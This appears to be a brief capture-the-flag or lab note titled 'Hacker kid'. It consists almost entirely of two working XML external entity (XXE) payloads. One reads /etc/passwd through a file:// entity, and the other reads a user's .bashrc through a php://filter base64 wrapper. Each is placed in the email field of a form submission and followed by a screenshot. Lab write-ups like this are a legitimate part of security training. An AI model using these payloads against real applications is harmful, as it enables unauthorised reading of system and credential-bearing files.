# From Hacker kid
## Read to /etc/passwd

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
<name>hoge</name><tel>12345678901</tel><email>&xxe;</email><password>hoge</password></root>
```
![](Assets/Images/Pasted%20image%2020260430122842.png)

---
## Read to .bashrc

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">]>
<root>
<name>hoge</name><tel>12345678901</tel><email>&xxe;</email><password>hoge</password></root>
```
![](Assets/Images/Pasted%20image%2020260430152425.png)

